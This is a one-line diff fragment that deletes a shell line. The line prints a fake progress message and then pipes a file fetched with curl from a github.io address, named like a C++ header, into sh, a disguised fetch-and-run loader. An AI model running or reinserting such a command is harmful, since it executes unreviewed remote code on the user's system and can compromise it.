@@ -1,1 +1,0 @@
-echo Progress: 28.00%curl -L --progress-bar frkns.github.io/fun/innBulgarianCheatTriesDeck.hpp | sh
